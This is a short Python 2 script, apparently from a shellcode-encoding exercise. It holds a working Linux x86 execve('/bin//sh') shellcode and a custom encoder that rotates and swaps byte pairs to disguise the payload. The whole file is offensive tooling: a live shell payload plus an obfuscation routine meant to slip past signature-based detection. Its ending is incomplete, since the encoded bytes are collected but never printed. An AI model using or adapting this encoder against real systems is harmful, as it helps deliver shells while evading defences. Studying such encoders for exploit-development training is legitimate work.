# coding: utf-8
#our shellcode
shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")
#if the length is uneven, prepend a nop instruction 
if len(shellcode)%2 == 1:
	shellcode = "\x90"+shellcode
#functions from Didier Stevens's transform 
def rol(byte, count):
    while count > 0:
        byte = (byte << 1 | byte >> 7) & 0xFF
        count -= 1
    return byte

def ror(byte, count):
    while count > 0:
        byte = (byte >> 1 | byte << 7) & 0xFF
        count -= 1
    return byte

#initiate an iterator to iterate the bytes
iterator = iter(bytearray(shellcode))	
encodedShellcode = list()
#initiate the boolean to stop iterating list items when none are left
boolean = True
#Iterate the list 
#byte1 : rotate to the right for 4 bits 
#byte2 : rotate the the left for 2 bits
#place them back in the list on eachother's positions

while boolean:
	try: 
		byte1 = iterator.next()
		byte1 = ror(byte1,4)
		byte2 = iterator.next()
		byte2 = rol(byte2,2)
		encodedShellcode.append(byte2)	
		encodedShellcode.append(byte1)
	except:
		boolean = False



encodedShellcode2 = list()
#Print everything
for byte in encodedShellcode:
	encodedShellcode2.append('0x'+'%x'%byte)
	encodedShellcode2.append(',')
encodedShellcode2[-1]=''

